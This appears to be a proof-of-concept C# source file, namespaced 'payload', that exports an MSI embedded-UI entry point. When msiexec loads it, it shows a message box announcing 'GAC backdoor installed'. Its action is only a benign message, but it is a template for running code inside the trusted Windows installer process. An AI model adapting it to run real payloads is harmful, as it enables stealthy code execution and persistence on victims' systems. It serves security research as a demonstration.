using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using RGiesecke.DllExport;

namespace payload
{
    public class Class1
    {

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
        [DllImport("wtsapi32.dll", SetLastError = true)]
        static extern bool WTSSendMessage(
            IntPtr hServer,
            [MarshalAs(UnmanagedType.I4)] int SessionId,
            String pTitle,
            [MarshalAs(UnmanagedType.U4)] int TitleLength,
            String pMessage,
            [MarshalAs(UnmanagedType.U4)] int MessageLength,
            [MarshalAs(UnmanagedType.U4)] int Style,
            [MarshalAs(UnmanagedType.U4)] int Timeout,
            [MarshalAs(UnmanagedType.U4)] out int pResponse,
            bool bWait);

        [DllExport]
        public static void FirstExportSkipped()
        {
        }

        [DllExport]
        public static int InitializeEmbeddedUI(int stringSize ,[MarshalAs(UnmanagedType.LPStr)] string stringVar, IntPtr outPtr)
        {
            string title = "MSIEXEC - GAC backdoor installed";
            IntPtr WTS_CURRENT_SERVER_HANDLE = IntPtr.Zero;
            int WTS_CURRENT_SESSION = 1;
            int resp = 1;
            WTSSendMessage(WTS_CURRENT_SERVER_HANDLE, WTS_CURRENT_SESSION, title, title.Length, stringVar, stringSize, 0, 0, out resp, false);
            return 1337;
        }
    }

}
